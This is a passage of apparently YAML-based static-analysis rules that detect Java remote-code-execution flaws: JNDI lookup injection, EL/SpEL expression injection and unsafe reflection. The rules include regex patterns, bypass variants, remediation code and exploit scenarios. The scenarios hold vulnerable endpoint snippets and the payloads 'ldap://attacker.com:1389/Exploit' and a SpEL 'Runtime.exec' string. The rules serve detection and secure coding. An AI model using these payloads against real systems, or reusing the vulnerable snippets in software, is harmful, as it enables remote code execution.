  # --------------------------------------------------------------------------
  # RCE-JAVA-004: JNDI Lookup Injection
  # --------------------------------------------------------------------------
  - rule_id: "RCE-JAVA-004"
    title: "JNDI InitialContext.lookup with User-Controlled Name"
    description: >
      Detects usage of Java's JNDI (Java Naming and Directory Interface)
      InitialContext.lookup() where the lookup name is derived from user-
      controlled input. JNDI lookup with protocols like ldap://, rmi://,
      dns://, or iiop:// can be exploited to load remote objects, triggering
      arbitrary code execution via deserialization or remote class loading.
      This is the same class of vulnerability exploited by Log4Shell
      (CVE-2021-44228) and remains a critical RCE vector in Java.
    language: java
    category: rce
    severity: Critical
    confidence: 0.95
    cwe: CWE-94
    owasp: "A03:2021-Injection"
    tags:
      - rce
      - jndi
      - jndi-injection
      - ldap
      - rmi
      - log4shell
      - deserialization
      - java
      - critical
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: '(?:InitialContext|Context)\s*[\s\S]{0,200}\.lookup\s*\(\s*(?:request\.getParameter|req\.getParameter|param|input|name|jndiName|user|data)'
        description: "JNDI lookup with user-controlled name"
      - type: regex
        pattern: 'new\s+InitialContext\s*\(\s*\)[\s\S]{0,200}\.lookup\s*\(\s*(?:request\.|name|uri|url|input|user|data|jndi)'
        description: "InitialContext.lookup with user-controlled name"
      - type: regex
        pattern: '(?:ctx|context)\s*\.\s*lookup\s*\(\s*"(?:ldap|rmi|ldaps|dns|iiop|corba)://"\s*\+\s*(?:request\.|param|input|user|data)'
        description: "JNDI lookup with user-controlled LDAP/RMI URL"
      - type: regex
        pattern: 'String\s+(?:jndiName|lookupName|name)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}\.lookup\s*\('
        description: "JNDI name from request parameter used in lookup"
      - type: regex
        pattern: 'NamingManager\s*\.\s*(?:getObjectInstance|getInitialContext)\s*\([^)]*(?:request\.|input|user|data|name)'
        description: "NamingManager with user-controlled input"
      - type: regex
        pattern: '(?:DirContext|LdapContext)\s*[\s\S]{0,200}\.(?:lookup|search|getAttributes)\s*\(\s*(?:request\.|name|dn|filter|input|user)'
        description: "Directory context operations with user-controlled input"
      - type: regex
        pattern: 'JndiTemplate\s*[\s\S]{0,200}\.lookup\s*\(\s*(?:request\.|name|uri|input|user|data|jndi)'
        description: "Spring JndiTemplate lookup with user-controlled name"
    anti_patterns:
      - '\.lookup\s*\(\s*"java:(?:comp|global|module|app)/'
      - '\.lookup\s*\(\s*"(?:jdbc|jms|mail|bean)/'
      - '\.lookup\s*\(\s*(?:JNDI_NAME|DATA_SOURCE|JMS_QUEUE|Constants\.)\s*\)'
      - '@Test'
      - 'class\s+\w+Test\s'
      - 'import\s+org\.(?:junit|mockito)'
      - 'Mockito\.\w+'
      - '@SpringBootTest'
      - '@MockBean'
      - '\.lookup\s*\(\s*"CN='
    bypass_variants:
      - description: "LDAP referral to external code base"
        pattern: '\.lookup\s*\(\s*"ldap://[^"]*(?:request\.|param|input|user)'
      - description: "RMI registry pointing to malicious codebase"
        pattern: '\.lookup\s*\(\s*"rmi://[^"]*(?:request\.|param|input|user)'
      - description: "Serialized object in LDAP entry (javaSerializedData)"
        pattern: '(?:javaSerializedData|javaCodeBase|javaClassName|javaFactory)'
      - description: "Log4j style JNDI injection via logging"
        pattern: '(?:log|logger|LOG)\s*\.\s*(?:info|error|debug|warn)\s*\(\s*(?:request\.|input|user|data|param)'
    evasion_indicators:
      - "LDAP/RMI URL with external server"
      - "Serialized Java object in LDAP response"
      - "Remote codebase URL in LDAP attributes"
      - "Log4j-style ${jndi:ldap://...} injection"
      - "DNS tunneling via JNDI DNS provider"
    encoding_variants:
      - type: "url_encoding"
        pattern: '\.lookup\s*\(.*?%(?:24|7[bB]|6[aA]|6[eE]).*?(?:jndi|ldap|rmi)'
      - type: "unicode_escape"
        pattern: '\.lookup\s*\(.*?\\u(?:006[aA]|006[eE]|0064|0069)'
      - type: "nested_lookup"
        pattern: '\.lookup\s*\(.*?\$\{[^}]*\$\{[^}]*\}'
    multi_function_chain_patterns:
      - "request.getParameter('name') -> ctx.lookup(name) -> remote object deserialization"
      - "user input -> JNDI URL construction -> InitialContext.lookup -> class loading"
      - "HTTP header -> log message -> Log4j -> JNDI lookup -> RCE"
      - "user input -> LDAP search filter -> directory lookup -> code execution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "JNDI injection enables remote class loading and deserialization for full RCE"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "request.getParameter('name')"
        sink: "ctx.lookup(name)"
        through: "servlet parameter to JNDI lookup"
      - source: "request.getHeader('X-Api-Key')"
        sink: "logger.info('Key: ' + apiKey)"
        through: "HTTP header to Log4j logging to JNDI lookup"
      - source: "@RequestParam String resource"
        sink: "jndiTemplate.lookup(resource)"
        through: "Spring parameter to JNDI lookup"
    impact: |
      Remote code execution via JNDI class loading (LDAP/RMI):
      - Arbitrary deserialization of malicious Java objects
      - Full JVM and OS-level compromise
      - Log4Shell-class vulnerabilities affecting the entire infrastructure
      - Data exfiltration via DNS JNDI provider
    remediation: |
      Never pass user input to JNDI lookup:

      ```java
      // VULNERABLE:
      ctx.lookup(userInput);

      // SECURE: Use allowlist for JNDI names
      private static final Set<String> ALLOWED_JNDI = Set.of(
          "java:comp/env/jdbc/MainDB",
          "java:comp/env/jms/OrderQueue"
      );

      public Object safeLookup(String name) throws NamingException {
          if (!ALLOWED_JNDI.contains(name)) {
              throw new SecurityException("JNDI name not allowed: " + name);
          }
          return new InitialContext().lookup(name);
      }

      // JVM flags to restrict JNDI protocols (Java 8u191+):
      // -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
      // -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/94.html"
      - "https://owasp.org/Top10/A03_2021-Injection/"
      - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
      - "https://www.lunasec.io/docs/blog/log4j-zero-day/"
    context_awareness:
      surrounding_context_patterns:
        - 'import\s+javax\.naming\.'
        - 'InitialContext'
        - 'class\s+\w+(?:Controller|Service|Handler)\s'
        - '@(?:GetMapping|PostMapping|RequestMapping)'
      taint_source_indicators:
        - 'request\.getParameter\s*\('
        - 'request\.getHeader\s*\('
        - '@RequestParam\s+'
        - '@RequestBody\s+'
        - '@PathVariable\s+'
      taint_sink_indicators:
        - '\.lookup\s*\('
        - 'NamingManager\.\w+\s*\('
        - 'InitialContext\s*\(\s*\)'
        - 'JndiTemplate.*lookup\s*\('
      sanitization_patterns:
        - 'ALLOWED_JNDI'
        - 'jndi\.allowlist'
        - 'validateJndiName\s*\('
        - 'trustURLCodebase\s*=\s*false'
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 + remote_class_loading_factor)"
      exploitability_score: "Critical"
    exploit_scenario:
      attack_example: |
        A Java application uses JNDI for resource lookup:

        @GetMapping("/api/resource")
        public String getResource(@RequestParam String name) {
            Context ctx = new InitialContext();
            Object resource = ctx.lookup(name);
            return resource.toString();
        }

        Attacker sends:
        GET /api/resource?name=ldap://attacker.com:1389/Exploit

        The server connects to the attacker's LDAP server, which returns
        a reference to a malicious Java class that executes arbitrary code.
      example_payload: "ldap://attacker.com:1389/Exploit"
      attacker_objective: "Execute arbitrary code via JNDI remote class loading"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2026-02-28"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules:
        - "RCE-JAVA-001"
        - "RCE-JAVA-003"
        - "RCE-JAVA-005"

  # --------------------------------------------------------------------------
  # RCE-JAVA-005: Expression Language (EL) Evaluation
  # --------------------------------------------------------------------------
  - rule_id: "RCE-JAVA-005"
    title: "Expression Language Evaluation with User Input"
    description: >
      Detects usage of Java Expression Language (EL), Unified EL, or Spring
      Expression Language (SpEL) where the expression string is derived from
      user-controlled input. EL/SpEL provide powerful capabilities including
      method invocation, constructor calls, property access, type references,
      and operator overloading. When user input is evaluated as an EL/SpEL
      expression, attackers can invoke Runtime.exec(), access the ClassLoader,
      or perform any Java operation available via reflection. SpEL injection
      and EL injection are common and critical RCE vectors in Java applications.
    language: java
    category: rce
    severity: High
    confidence: 0.94
    cwe: CWE-94
    owasp: "A03:2021-Injection"
    tags:
      - rce
      - spel
      - expression-language
      - el-injection
      - spring
      - code-injection
      - java
      - critical
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'SpelExpressionParser\s*[\s\S]{0,300}\.parseExpression\s*\(\s*(?:request\.getParameter|req\.getParameter|param|input|expression|expr|user|data)'
        description: "SpEL parser with user-controlled expression"
      - type: regex
        pattern: '\.parseExpression\s*\(\s*(?:request\.|expr|expression|input|user|data|param|formula)\s*\)[\s\S]{0,200}\.getValue\s*\('
        description: "SpEL parseExpression followed by getValue with user input"
      - type: regex
        pattern: 'ExpressionFactory[\s\S]{0,200}\.createValueExpression\s*\([^,]*,\s*(?:request\.|input|expr|user|data|param)'
        description: "EL ExpressionFactory.createValueExpression with user input"
      - type: regex
        pattern: 'ELProcessor[\s\S]{0,200}\.eval\s*\(\s*(?:request\.|input|expr|user|data|param)'
        description: "ELProcessor.eval with user-controlled expression"
      - type: regex
        pattern: 'String\s+(?:expression|expr|spel)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}parseExpression\s*\('
        description: "Expression from request parameter used in EL/SpEL parsing"
      - type: regex
        pattern: 'StandardEvaluationContext[\s\S]{0,200}\.setVariable\s*\(\s*"[^"]+"\s*,\s*(?:request\.|input|user|data|param)'
        description: "SpEL context with user-controlled variable values"
    anti_patterns:
      - '\.parseExpression\s*\(\s*"[^"]*"\s*\)'
      - '\.parseExpression\s*\(\s*(?:EXPRESSION|SPEL|Constants\.)\s*\)'
      - '@Test'
      - 'class\s+\w+Test\s'
      - 'import\s+org\.(?:junit|mockito)'
      - 'Mockito\.\w+'
      - '@SpringBootTest'
      - '@MockBean'
      - 'SimpleEvaluationContext\.forReadOnlyDataBinding'
    bypass_variants:
      - description: "T() operator for type access and static method invocation"
        pattern: 'parseExpression\s*\(.*?T\s*\(\s*java\.lang\.'
      - description: "New object construction via SpEL"
        pattern: 'parseExpression\s*\(.*?new\s+java\.'
      - description: "Reflection via SpEL for class loading"
        pattern: 'parseExpression\s*\(.*?(?:forName|getDeclaredMethod|invoke)\s*\('
      - description: "Spring Bean access via SpEL"
        pattern: 'parseExpression\s*\(.*?(?:@\w+|#\w+)\s*\.'
    evasion_indicators:
      - "T() operator for Java class access in SpEL"
      - "Runtime.getRuntime().exec() via T(java.lang.Runtime)"
      - "Reflection chain via SpEL"
      - "New object instantiation in expression"
      - "Bean reference and method invocation"
    encoding_variants:
      - type: "unicode_escape"
        pattern: 'parseExpression\s*\(.*?\\u[0-9A-Fa-f]{4}'
      - type: "string_concat_evasion"
        pattern: 'parseExpression\s*\(\s*"[^"]*"\s*\.\s*concat\s*\('
      - type: "char_conversion"
        pattern: 'parseExpression\s*\(.*?new\s+String\s*\(\s*new\s+(?:char|byte)\s*\['
    multi_function_chain_patterns:
      - "request.getParameter('expr') -> parser.parseExpression(expr) -> expression.getValue()"
      - "@RequestParam expression -> SpEL parse -> T(Runtime).exec() -> RCE"
      - "user input -> StandardEvaluationContext -> SpEL evaluation -> method invocation"
      - "user input -> ELProcessor.eval -> Java method access -> command execution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "EL/SpEL provides full Java class access via T() operator for arbitrary code execution"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "request.getParameter('expression')"
        sink: "parser.parseExpression(expression).getValue(context)"
        through: "servlet parameter to SpEL evaluation"
      - source: "@RequestParam String filter"
        sink: "parser.parseExpression(filter).getValue()"
        through: "Spring parameter to SpEL filter expression"
      - source: "request.getParameter('formula')"
        sink: "elProcessor.eval(formula)"
        through: "formula parameter to EL evaluation"
    impact: |
      Arbitrary Java method invocation via EL/SpEL:
      - OS command execution via Runtime.exec() or ProcessBuilder
      - File system access via java.io classes
      - Spring Bean access and method invocation
      - Full JVM and system compromise
    remediation: |
      Use SimpleEvaluationContext instead of StandardEvaluationContext:

      ```java
      // VULNERABLE:
      StandardEvaluationContext ctx = new StandardEvaluationContext();
      parser.parseExpression(userExpr).getValue(ctx);

      // SECURE: SimpleEvaluationContext with read-only access
      SimpleEvaluationContext ctx = SimpleEvaluationContext
          .forReadOnlyDataBinding()
          .withRootObject(rootObject)
          .build();
      parser.parseExpression(expression).getValue(ctx);

      // Even safer: validate expression against allowlist
      Pattern SAFE_EXPR = Pattern.compile("^[a-zA-Z][a-zA-Z0-9.]+$");
      if (!SAFE_EXPR.matcher(expression).matches()) {
          throw new IllegalArgumentException("Invalid expression");
      }
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/94.html"
      - "https://owasp.org/Top10/A03_2021-Injection/"
      - "https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions"
      - "https://portswigger.net/research/expression-language-injection"
    context_awareness:
      surrounding_context_patterns:
        - 'import\s+org\.springframework\.expression\.'
        - 'SpelExpressionParser'
        - 'ExpressionParser'
        - 'ELProcessor'
        - 'ExpressionFactory'
        - 'class\s+\w+(?:Controller|Service|Handler)\s'
      taint_source_indicators:
        - 'request\.getParameter\s*\('
        - '@RequestParam\s+'
        - '@RequestBody\s+'
        - '@PathVariable\s+'
        - 'request\.getHeader\s*\('
      taint_sink_indicators:
        - '\.parseExpression\s*\('
        - '\.getValue\s*\('
        - '\.eval\s*\('
        - 'createValueExpression'
      sanitization_patterns:
        - 'SimpleEvaluationContext'
        - 'forReadOnlyDataBinding\s*\('
        - 'ALLOWED_EXPRESSIONS'
        - 'expression\.matches\s*\('
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 + spring_bean_access_risk)"
      exploitability_score: "Critical"
    exploit_scenario:
      attack_example: |
        A Spring Boot API evaluates SpEL expressions for dynamic filtering:

        @GetMapping("/api/search")
        public List<Item> search(@RequestParam String filter) {
            ExpressionParser parser = new SpelExpressionParser();
            StandardEvaluationContext ctx = new StandardEvaluationContext();
            ctx.setRootObject(items);
            return parser.parseExpression(filter).getValue(ctx, List.class);
        }

        Attacker sends:
        GET /api/search?filter=T(java.lang.Runtime).getRuntime().exec('id')
      example_payload: "T(java.lang.Runtime).getRuntime().exec('id')"
      attacker_objective: "Execute arbitrary Java code via EL/SpEL injection"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2026-02-28"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules:
        - "RCE-JAVA-001"
        - "RCE-JAVA-003"
        - "RCE-JAVA-006"

  # --------------------------------------------------------------------------
  # RCE-JAVA-006: Unsafe Reflection with User Class Names
  # --------------------------------------------------------------------------
  - rule_id: "RCE-JAVA-006"
    title: "Unsafe Reflection with User-Controlled Class Names"
    description: >
      Detects Java reflection patterns where the class name, method name, or
      constructor arguments are derived from user-controlled input. Class.forName()
      with a user-supplied class name allows arbitrary class loading and
      instantiation. Combined with Method.invoke() and Constructor.newInstance(),
      attackers can instantiate any class on the classpath and invoke any method,
      including Runtime.exec() and ProcessBuilder.start(). This is a fundamental
      RCE vector when reflection parameters are controllable.
    language: java
    category: rce
    severity: High
    confidence: 0.90
    cwe: CWE-94
    owasp: "A03:2021-Injection"
    tags:
      - rce
      - reflection
      - class-forname
      - class-loading
      - code-injection
      - java
      - critical
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'Class\.forName\s*\(\s*(?:request\.getParameter|req\.getParameter|param|input|className|clsName|type|user|data)'
        description: "Class.forName with user-controlled class name"
      - type: regex
        pattern: 'Class\.forName\s*\(\s*(?:className|clazz|type|name)\s*\)[\s\S]{0,300}\.(?:newInstance|getMethod|getDeclaredMethod|getConstructor)\s*\('
        description: "Class.forName followed by instantiation or method access"
      - type: regex
        pattern: '\.getMethod\s*\(\s*(?:request\.|methodName|method|action|input|user|param)'
        description: "getMethod with user-controlled method name"
      - type: regex
        pattern: '\.invoke\s*\(\s*(?:instance|obj|target)\s*,[\s\S]{0,100}(?:request\.|param|input|user|args)'
        description: "Method.invoke with user-controlled arguments"
      - type: regex
        pattern: 'String\s+(?:className|clazz|type)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}Class\.forName\s*\('
        description: "Class name from request parameter used in Class.forName"
      - type: regex
        pattern: 'Thread\.currentThread\s*\(\s*\)\s*\.getContextClassLoader\s*\(\s*\)\s*\.loadClass\s*\(\s*(?:request\.|className|input|user|param)'
        description: "ClassLoader.loadClass with user-controlled class name"
      - type: regex
        pattern: 'URLClassLoader[\s\S]{0,200}(?:request\.|url|input|user|param)[\s\S]{0,200}loadClass\s*\('
        description: "URLClassLoader with user-controlled URL and class loading"
    anti_patterns:
      - 'Class\.forName\s*\(\s*"[a-zA-Z0-9.]+"\s*\)'
      - 'Class\.forName\s*\(\s*(?:DRIVER|CLASS_NAME|Constants\.)\s*\)'
      - '@Test'
      - 'class\s+\w+Test\s'
      - 'import\s+org\.(?:junit|mockito)'
      - 'Mockito\.\w+'
      - '@SpringBootTest'
      - '@MockBean'
      - 'Class\.forName\s*\(\s*"(?:com\.mysql|oracle\.jdbc|org\.postgresql)'
    bypass_variants:
      - description: "Class loaded via ServiceLoader"
        pattern: 'ServiceLoader\.load\s*\(\s*Class\.forName\s*\(\s*(?:request\.|input|user)'
      - description: "Factory pattern with user-controlled type"
        pattern: '(?:factory|Factory)[\s\S]{0,200}Class\.forName\s*\(\s*(?:type|className|input)'
      - description: "Proxy-based reflection bypass"
        pattern: 'Proxy\.newProxyInstance[\s\S]{0,200}(?:request\.|input|user|className)'
      - description: "MethodHandle for reflection bypass"
        pattern: 'MethodHandles\.lookup\s*\(\s*\)[\s\S]{0,200}(?:request\.|input|className)'
    evasion_indicators:
      - "Class.forName with concatenated or formatted class name"
      - "ClassLoader.loadClass from user-controlled URL"
      - "Method.invoke with dynamically resolved method name"
      - "Constructor.newInstance with user-controlled arguments"
      - "MethodHandle used instead of traditional reflection"
    encoding_variants:
      - type: "url_encoded_class"
        pattern: 'Class\.forName\s*\(.*?%[0-9A-Fa-f]{2}'
      - type: "string_builder_class"
        pattern: 'StringBuilder[\s\S]{0,200}Class\.forName'
      - type: "property_lookup"
        pattern: 'Properties[\s\S]{0,200}getProperty[\s\S]{0,200}Class\.forName'
    multi_function_chain_patterns:
      - "request.getParameter('class') -> Class.forName(cls) -> newInstance()"
      - "@RequestParam className -> Class.forName -> getMethod -> invoke"
      - "user input -> class name -> Class.forName -> constructor -> newInstance -> RCE"
      - "className + methodName -> Class.forName -> getDeclaredMethod -> setAccessible -> invoke"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Unrestricted Class.forName enables loading any class on classpath including Runtime for RCE"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "request.getParameter('class')"
        sink: "Class.forName(className).newInstance()"
        through: "servlet parameter to class loading"
      - source: "@RequestParam String type"
        sink: "Class.forName(type).getMethod(method).invoke()"
        through: "Spring parameter to reflection invocation"
      - source: "request.getParameter('action')"
        sink: "method.invoke(instance, args)"
        through: "action parameter to method invocation"
    impact: |
      Unsafe reflection with user input enables full RCE:
      - Arbitrary class instantiation on the classpath
      - Any method invocation including Runtime.exec()
      - Private method access via setAccessible(true)
      - Remote class loading via URLClassLoader
      - Full system compromise with JVM privileges
    remediation: |
      Use allowlist for class and method names:

      ```java
      // VULNERABLE:
      Class<?> cls = Class.forName(request.getParameter("class"));
      Object obj = cls.newInstance();

      // SECURE: Allowlist of permitted classes
      private static final Map<String, Class<?>> ALLOWED = Map.of(
          "csv", CsvExporter.class,
          "pdf", PdfExporter.class,
          "xlsx", XlsxExporter.class
      );

      public Exporter getExporter(String type) {
          Class<?> cls = ALLOWED.get(type);
          if (cls == null) {
              throw new IllegalArgumentException("Unknown exporter: " + type);
          }
          return (Exporter) cls.getDeclaredConstructor().newInstance();
      }
      ```
